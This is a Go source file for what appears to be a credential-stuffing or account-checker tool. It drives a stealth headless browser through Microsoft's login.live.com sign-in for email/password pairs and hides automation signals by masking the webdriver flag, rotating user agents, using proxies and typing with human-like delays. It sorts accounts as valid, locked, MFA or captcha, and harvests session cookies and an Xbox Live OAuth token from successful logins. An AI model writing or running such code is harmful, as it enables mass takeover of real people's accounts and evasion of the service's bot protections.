package converter

import (
	"context"
	"errors"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync/atomic"
	"time"

	"github.com/go-rod/rod"
	"github.com/go-rod/rod/lib/input"
	"github.com/go-rod/rod/lib/launcher"
	"github.com/go-rod/rod/lib/proto"
)

// Status classifies the outcome of one credential conversion.
type Status string

const (
	StatusSuccess  Status = "success"
	StatusMFA      Status = "mfa"
	StatusInvalid  Status = "invalid"
	StatusLocked   Status = "locked"
	StatusCaptcha  Status = "captcha"
	StatusTimeout  Status = "timeout"
	StatusNetwork  Status = "network"
	StatusDOM      Status = "dom"
	StatusExtract  Status = "extract"
	StatusSkipped  Status = "skipped"
)

// Transient reports whether the status deserves a retry.
func (s Status) Transient() bool {
	switch s {
	case StatusTimeout, StatusNetwork, StatusDOM, StatusExtract:
		return true
	}
	return false
}

// BrowserOpts configures the shared headless browser.
type BrowserOpts struct {
	BrowserPath string        // empty = auto-detect Chrome/Edge
	Proxy       string        // http(s):// or socks5:// (no credentials)
	UserAgents  []string      // rotated per account
	ProxyForURL bool          // proxy already validated as URL
}

var loginURL = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"

var (
	reAccessToken = regexp.MustCompile(`access_token=([^&]+)`)
	uaPool        = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
	}
)

var defaultUAIndex atomic.Uint64

// LaunchBrowser starts the shared headless browser used by all workers.
func LaunchBrowser(ctx context.Context, opts BrowserOpts) (*rod.Browser, error) {
	l := launcher.New().
		Headless(true).
		Leakless(false).
		NoSandbox(true).
		Set("disable-blink-features", "AutomationControlled").
		Set("disable-dev-shm-usage", "").
		Set("no-first-run", "").
		Set("no-default-browser-check", "").
		Set("window-size", "1920,1080")
	if opts.BrowserPath != "" {
		l = l.Bin(opts.BrowserPath)
	}
	if opts.Proxy != "" {
		l = l.Proxy(opts.Proxy)
	}
	url, err := l.Launch()
	if err != nil {
		return nil, fmt.Errorf("browser launch failed (install Chrome/Edge or set converter.browser_path): %w", err)
	}
	browser := rod.New().
		Context(ctx).
		ControlURL(url)
	if err := browser.Connect(); err != nil {
		return nil, fmt.Errorf("browser connect failed: %w", err)
	}
	return browser, nil
}

func pickUA() string {
	i := defaultUAIndex.Add(1)
	return uaPool[(i-1)%uint64(len(uaPool))]
}

// LoginLive drives the full login.live.com flow in an incognito context and
// returns the resulting session cookies plus the OAuth access token.
func LoginLive(ctx context.Context, browser *rod.Browser, email, password string, sleep func(), logf func(string, ...interface{})) (cks []Cookie, tok string, st Status, err error) {
	if logf == nil {
		logf = func(string, ...interface{}) {}
	}
	// rod panics with the context error when a deadline expires mid-call
	// (e.g. the 45s navigation deadline). Convert those to clean timeouts.
	defer func() {
		if rec := recover(); rec != nil {
			logf("panic recovered: %v", rec)
			cks, tok, st, err = nil, "", StatusTimeout, fmt.Errorf("login panic: %v", rec)
		}
	}()
	incog, err := browser.Incognito()
	if err != nil {
		return nil, "", StatusNetwork, err
	}
	defer incog.Close()

	page, err := incog.Page(proto.TargetCreateTarget{})
	if err != nil {
		return nil, "", StatusNetwork, err
	}
	defer page.Close()
	logf("page created")

	ua := pickUA()
	if err := page.SetUserAgent(&proto.NetworkSetUserAgentOverride{UserAgent: ua}); err != nil {
		return nil, "", StatusNetwork, err
	}
	if _, err := page.EvalOnNewDocument(`Object.defineProperty(navigator, 'webdriver', { get: () => undefined })`); err != nil {
		return nil, "", StatusNetwork, err
	}

	navCtx, cancel := context.WithTimeout(ctx, 45*time.Second)
	defer cancel()
	if err := page.Context(navCtx).Navigate(loginURL); err != nil {
		logf("navigate err: %v", err)
		return nil, "", StatusNetwork, err
	}
	logf("navigated, url=%s", pageURL(page))

	// Step 1: wait for the email field (or a token if already redirected)
	if _, err := page.Timeout(30 * time.Second).Element("input[name=loginfmt], input#i0116, input[type=email]"); err != nil {
		logf("email field not found, url=%s", pageURL(page))
		if tok := tokenFromURL(pageURL(page)); tok != "" {
			return collectCookies(page, tok)
		}
		return nil, "", StatusTimeout, nil
	}
	logf("email field found")
	if tok := tokenFromURL(pageURL(page)); tok != "" {
		return collectCookies(page, tok)
	}

	emailEl, err := page.Timeout(15 * time.Second).Element("input[name=loginfmt], input#i0116, input[type=email]")
	if err != nil {
		return nil, "", StatusDOM, nil
	}
	if err := emailEl.Input(email); err != nil {
		logf("email input err: %v", err)
		return nil, "", StatusDOM, nil
	}
	logf("email typed")
	sleep()
	if err := submit(page, logf); err != nil {
		logf("next click err: %v", err)
		return nil, "", StatusDOM, nil
	}
	logf("next clicked, url=%s", pageURL(page))

	// Step 2: wait for the password field, detecting failures early
	stage, err := waitFor(page, 45*time.Second, func() string {
		if tok := tokenFromURL(pageURL(page)); tok != "" {
			return "token"
		}
		if ok, _, _ := page.Has("input#i0118, input[type=password]"); ok {
			return "password"
		}
		if reason := checkFailurePage(page); reason != "" {
			return "fail:" + reason
		}
		return "none"
	})
	if err != nil {
		return nil, "", StatusTimeout, nil
	}
	logf("step2 stage=%s url=%s", stage, pageURL(page))
	if stage == "token" {
		return collectCookies(page, tokenFromURL(pageURL(page)))
	}
	if strings.HasPrefix(stage, "fail:") {
		logf("step2 failure page: %s", strings.TrimPrefix(stage, "fail:"))
		return nil, "", classifyFailure(strings.TrimPrefix(stage, "fail:")), nil
	}

	passEl, err := page.Timeout(15 * time.Second).Element("input#i0118, input[type=password]")
	if err != nil {
		logf("password field not found, url=%s", pageURL(page))
		return nil, "", StatusDOM, nil
	}
	logf("password field found")
	if err := passEl.Click(proto.InputMouseButtonLeft, 1); err == nil {
		for _, ch := range password {
			if err := page.Keyboard.MustType(input.Key(ch)); err != nil {
				break
			}
			sleepMS(40 + rand.Intn(80))
		}
	} else {
		if err := passEl.Input(password); err != nil {
			return nil, "", StatusDOM, nil
		}
	}
	sleep()
	if err := submit(page, logf); err != nil {
		logf("submit click err: %v", err)
		return nil, "", StatusDOM, nil
	}
	logf("submit clicked, url=%s", pageURL(page))

	// Step 3: wait for the final result
	stage, err = waitFor(page, 60*time.Second, func() string {
		tok := tokenFromURL(pageURL(page))
		if tok != "" {
			return "token"
		}
		if ok, _, _ := page.Has("#idSIButton9"); ok {
			return "stay"
		}
		if ok, _, _ := page.Has("#iCancel"); ok {
			return "skip"
		}
		if reason := checkFailurePage(page); reason != "" {
			return "fail:" + reason
		}
		return "none"
	})
	if err != nil {
		return nil, "", StatusTimeout, nil
	}
	logf("step3 stage=%s url=%s", stage, pageURL(page))
	switch {
	case stage == "token":
		return collectCookies(page, tokenFromURL(pageURL(page)))
	case stage == "stay":
		if err := click(page, "#idSIButton9"); err != nil {
			return nil, "", StatusDOM, nil
		}
		stage, err = waitFor(page, 30*time.Second, func() string {
			tok := tokenFromURL(pageURL(page))
			if tok != "" {
				return "token"
			}
			return "none"
		})
		if err != nil || stage != "token" {
			return nil, "", StatusExtract, nil
		}
		return collectCookies(page, tokenFromURL(pageURL(page)))
	case stage == "skip":
		// "Protect your account" / security prompt with a Skip control
		if err := click(page, "#iCancel"); err == nil {
			sleep()
		}
		return nil, "", StatusMFA, nil
	case strings.HasPrefix(stage, "fail:"):
		return nil, "", classifyFailure(strings.TrimPrefix(stage, "fail:")), nil
	}
	return nil, "", StatusTimeout, nil
}

func collectCookies(page *rod.Page, token string) ([]Cookie, string, Status, error) {
	cookies, err := page.Cookies(nil)
	if err != nil {
		return nil, "", StatusExtract, err
	}
	var out []Cookie
	for _, c := range cookies {
		if c.Name == "" || c.Value == "" {
			continue
		}
		hostOnly := !strings.HasPrefix(c.Domain, ".")
		out = append(out, Cookie{
			Domain:   c.Domain,
			Path:     c.Path,
			Name:     c.Name,
			Value:    c.Value,
			Secure:   c.Secure,
			HTTPOnly: c.HTTPOnly,
			HostOnly: hostOnly,
			Expires:  int64(c.Expires),
		})
	}
	if len(out) == 0 {
		return nil, "", StatusExtract, errors.New("no cookies returned")
	}
	return out, token, StatusSuccess, nil
}

func submit(page *rod.Page, logf func(string, ...interface{})) error {
	if err := click(page, "#i0281, input[type=submit], button[type=submit]"); err == nil {
		return nil
	}
	if err := page.Keyboard.Press(input.Enter); err != nil {
		return err
	}
	return nil
}

func click(page *rod.Page, selector string) error {
	el, err := page.Timeout(10 * time.Second).Element(selector)
	if err != nil {
		return err
	}
	el.MustScrollIntoView()
	el.MustClick()
	return nil
}

func sleepMS(ms int) {
	time.Sleep(time.Duration(ms) * time.Millisecond)
}

func waitFor(page *rod.Page, timeout time.Duration, check func() string) (string, error) {
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		stage := check()
		if stage != "none" {
			return stage, nil
		}
		sleepMS(300)
	}
	return "", errors.New("timeout waiting for page state")
}

func tokenFromURL(raw string) string {
	if !strings.Contains(raw, "#") {
		return ""
	}
	frag := strings.Split(raw, "#")[1]
	if m := reAccessToken.FindStringSubmatch(frag); len(m) > 1 {
		if v, err := url.QueryUnescape(m[1]); err == nil {
			return v
		}
		return m[1]
	}
	return ""
}
func pageURL(page *rod.Page) string {
	v, err := page.Eval(`() => location.href`)
	if err != nil {
		return ""
	}
	return v.Value.String()
}

func pageText(page *rod.Page) string {
	v, err := page.Eval(`() => document.body ? document.body.innerText : ''`)
	if err != nil {
		return ""
	}
	return v.Value.String()
}

func checkFailurePage(page *rod.Page) string {
	text := pageText(page)
	checks := []struct {
		text  string
		stage string
	}{
		{"Your password is incorrect", "invalid"},
		{"That password is incorrect", "invalid"},
		{"This account has been locked", "locked"},
		{"has been temporarily locked", "locked"},
		{"tried to sign in too many times", "invalid"},
		{"We couldn't find an account", "invalid"},
		{"We couldn't find a Microsoft account", "invalid"},
		{"That Microsoft account doesn't exist", "invalid"},
		{"Let's confirm you're not a bot", "captcha"},
		{"confirm you are not a robot", "captcha"},
		{"verify your identity", "mfa"},
		{"help us protect your account", "mfa"},
		{"approve your sign-in request", "mfa"},
		{"two-step verification", "mfa"},
		{"send a security code", "mfa"},
		{"This sign-in option isn't available", "invalid"},
	}
	for _, c := range checks {
		if strings.Contains(text, c.text) {
			return c.stage
		}
	}
	return ""
}

func classifyFailure(reason string) Status {
	switch reason {
	case "mfa":
		return StatusMFA
	case "captcha":
		return StatusCaptcha
	case "locked":
		return StatusLocked
	default:
		return StatusInvalid
	}
}

// ValidateSession checks the extracted access token against the userinfo
// endpoint. client may be nil (uses the default client).
func ValidateSession(ctx context.Context, token string, cookies []Cookie, client *http.Client) bool {
	if token == "" {
		return false
	}
	if client == nil {
		client = http.DefaultClient
	}
	req, err := http.NewRequestWithContext(ctx, "GET", "https://login.live.com/oauth20_userinfo.srf?access_token="+url.QueryEscape(token), nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", pickUA())
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if resp.StatusCode != 200 {
		return false
	}
	s := string(body)
	return !strings.Contains(s, "error") || strings.Contains(s, `"email"`) || strings.Contains(s, `"name"`)
}



